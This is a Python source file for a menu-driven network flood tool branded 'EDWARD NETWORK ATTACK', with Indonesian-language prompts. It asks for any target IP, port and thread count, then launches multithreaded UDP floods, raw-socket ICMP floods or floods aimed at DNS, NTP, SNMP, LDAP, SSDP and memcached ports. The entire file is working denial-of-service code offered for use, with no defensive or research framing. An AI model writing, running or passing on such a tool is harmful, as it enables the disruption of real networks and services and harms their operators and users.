import socket
import threading
import time
import random
import sys
import struct
import os
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

try:
    from colorama import init, Fore, Style
    init(autoreset=True)
except ImportError:
    class Fore:
        RED = GREEN = YELLOW = CYAN = MAGENTA = WHITE = BLUE = ""
    class Style:
        BRIGHT = RESET_ALL = ""

class EdwardAttack:
    def __init__(self):
        self.target_ip = ""
        self.target_port = 0
        self.threads = 200
        self.running = False
        self.packets_sent = 0
        self.start_time = None
        self.log_file = "edward_attack_log.txt"
        self.lock = threading.Lock()

    def clear(self):
        os.system("cls" if os.name == "nt" else "clear")

    def banner(self):
        self.clear()
        print(Fore.RED + Style.BRIGHT + r"""
███████╗██████╗ ██╗    ██╗ █████╗ ██████╗ ██████╗ 
██╔════╝██╔══██╗██║    ██║██╔══██╗██╔══██╗██╔══██╗
█████╗  ██║  ██║██║ █╗ ██║███████║██████╔╝██║  ██║
██╔══╝  ██║  ██║██║███╗██║██╔══██║██╔══██╗██║  ██║
███████╗██████╔╝╚███╔███╔╝██║  ██║██║  ██║██████╔╝
╚══════╝╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ 
        """ + Fore.CYAN + "              EDWARD NETWORK ATTACK" + Style.RESET_ALL)
        print(Fore.YELLOW + "─" * 60)
        print(Fore.WHITE + "         Network Flood Tool (UDP / ICMP / Amplification)")
        print(Fore.YELLOW + "─" * 60 + "\n")

    def log(self, message):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] {message}"
        with self.lock:
            with open(self.log_file, "a", encoding="utf-8") as f:
                f.write(log_entry + "\n")
            print(Fore.GREEN + log_entry)

    def udp_flood(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = random._urandom(1472)
        while self.running:
            try:
                port = random.randint(1, 65535) if self.target_port == 0 else self.target_port
                sock.sendto(payload, (self.target_ip, port))
                with self.lock:
                    self.packets_sent += 1
            except:
                pass

    def icmp_flood(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        except PermissionError:
            print(Fore.RED + "\n[!] Mode ICMP membutuhkan akses Administrator / Root")
            self.running = False
            return
        header = struct.pack("!BBHHH", 8, 0, 0, 0, 1)
        data = random._urandom(1400)
        packet = header + data
        while self.running:
            try:
                sock.sendto(packet, (self.target_ip, 0))
                with self.lock:
                    self.packets_sent += 1
            except:
                pass

    def ampl_udp_flood(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payloads = [
            b"\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00",
            random._urandom(512),
            random._urandom(1024),
            random._urandom(1400)
        ]
        while self.running:
            try:
                payload = random.choice(payloads)
                port = random.choice([53, 123, 161, 389, 1900, 11211]) if self.target_port == 0 else self.target_port
                sock.sendto(payload, (self.target_ip, port))
                with self.lock:
                    self.packets_sent += 1
            except:
                pass

    def status_monitor(self):
        while self.running:
            elapsed = time.time() - self.start_time
            pps = self.packets_sent / elapsed if elapsed > 0 else 0
            mbps = (self.packets_sent * 1400 * 8) / (elapsed * 1_000_000) if elapsed > 0 else 0
            print(Fore.MAGENTA + f"\r[STATUS] Paket: {self.packets_sent:,} | Waktu: {elapsed:.1f}s | Kecepatan: {pps:,.0f} pps | \~{mbps:.1f} Mbps   ", end="")
            sys.stdout.flush()
            time.sleep(0.4)

    def start_attack(self, mode):
        self.running = True
        self.packets_sent = 0
        self.start_time = time.time()
        self.clear()
        print(Fore.RED + Style.BRIGHT + "\n[ SERANGAN BERJALAN ]\n")
        self.log(f"Serangan dimulai → Target: {self.target_ip} | Mode: {mode} | Thread: {self.threads}")

        monitor = threading.Thread(target=self.status_monitor, daemon=True)
        monitor.start()

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            if mode == "UDP":
                for _ in range(self.threads):
                    executor.submit(self.udp_flood)
            elif mode == "ICMP":
                for _ in range(self.threads):
                    executor.submit(self.icmp_flood)
            elif mode == "AMPL":
                for _ in range(self.threads):
                    executor.submit(self.ampl_udp_flood)

            try:
                while self.running:
                    time.sleep(0.1)
            except KeyboardInterrupt:
                self.stop_attack()

    def stop_attack(self):
        self.running = False
        time.sleep(0.5)
        elapsed = time.time() - self.start_time
        self.clear()
        self.log(f"Serangan dihentikan | Total paket: {self.packets_sent:,} | Durasi: {elapsed:.2f} detik")
        print(Fore.RED + "\n[!] Serangan berhasil dihentikan.")
        print(Fore.CYAN + f"[*] Log disimpan di: {self.log_file}\n")

    def menu(self):
        while True:
            self.banner()
            print(Fore.CYAN + "[1] UDP Flood")
            print(Fore.CYAN + "[2] ICMP Flood")
            print(Fore.CYAN + "[3] Amplification UDP")
            print(Fore.CYAN + "[4] Keluar")
            print()

            choice = input(Fore.YELLOW + "Pilih jenis serangan (1-4): " + Fore.WHITE).strip()

            if choice == "4":
                self.clear()
                print(Fore.RED + "Keluar dari program...")
                sys.exit(0)

            if choice not in ["1", "2", "3"]:
                continue

            self.target_ip = input(Fore.YELLOW + "Masukkan IP target: " + Fore.WHITE).strip()

            if not self.target_ip:
                print(Fore.RED + "\n[!] IP target wajib diisi. Tools tidak akan jalan.")
                time.sleep(1.5)
                continue

            port_input = input(Fore.YELLOW + "Masukkan port (0 untuk port acak): " + Fore.WHITE).strip()
            self.target_port = int(port_input) if port_input.isdigit() else 0

            thread_input = input(Fore.YELLOW + "Jumlah thread (disarankan 200-500): " + Fore.WHITE).strip()
            self.threads = int(thread_input) if thread_input.isdigit() else 200

            print()
            print(Fore.RED + Style.BRIGHT + "Perhatian: Serangan akan terus berjalan sampai dihentikan dengan Ctrl+C")
            input(Fore.YELLOW + "Tekan ENTER untuk memulai..." + Style.RESET_ALL)

            mode_map = {"1": "UDP", "2": "ICMP", "3": "AMPL"}
            mode = mode_map.get(choice, "UDP")

            try:
                self.start_attack(mode)
            except KeyboardInterrupt:
                self.stop_attack()

if __name__ == "__main__":
    tool = EdwardAttack()
    tool.menu()